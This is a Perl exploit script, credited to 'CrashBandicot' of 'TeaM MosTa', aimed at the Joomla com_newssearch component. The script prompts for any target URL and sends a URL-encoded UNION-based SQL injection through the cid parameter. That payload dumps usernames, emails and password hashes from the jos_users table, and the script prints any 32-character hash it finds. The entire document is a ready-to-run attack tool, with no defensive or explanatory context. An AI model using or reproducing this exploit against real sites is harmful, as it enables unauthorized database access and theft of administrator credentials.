use LWP::Simple;

use LWP::UserAgent;

# from TeaM MosTa

system("cls");

system("color a");

print "*********************************************\n";

print "* Joomla com_newssearch  SQL Injection      *\n";

print "*      Coded by CrashBandicot               *\n";

print "*      From TeaM MosTa                      *\n";

print "*********************************************\n";

sleep 1;

print 'Enter Target (with http://) :';

my $target = <STDIN>;

chomp $target;

my $sql_path1 = "/index.php?option=com_newssearch&type=list&section=1&cid=%25%27%20and%201=2%29%20union%20select%201,%20concat%280x3a,username,0x3a,email,0x3a,0x3a,activation%29,concat%280x3a,username,0x3a,email,0x3a,password,0x3a,activation%29,%27Super%20Administrator%27,%27email%27,%272009-11-26%2022:09:28%27,%272009-11-26%2022:09:28%27,62,1,1,0,0,0,1,15%20from%20jos_users--%20";

$user_agent = LWP::UserAgent->new() or die "Error";

$user_agent->agent('Mozilla/5.0 (Windows NT 6.1; WOW64; rv:7.0.1) Gecko/20100101 Firefox/7.0.12011');

my $fuck = $target.$sql_path1;

$good = $user_agent->request(HTTP::Request->new(GET=>$fuck));

die "Can not get $fuck" unless defined $fuck;

$zebi = $good->content; if ($zebi =~/([0-9a-fA-F]{32})/) {

print "[+] $target is Vuln \n [+]Password Found ==> $1\n$2\n ";

}

else {

print "\n [-] $target is not vuln \n";

}
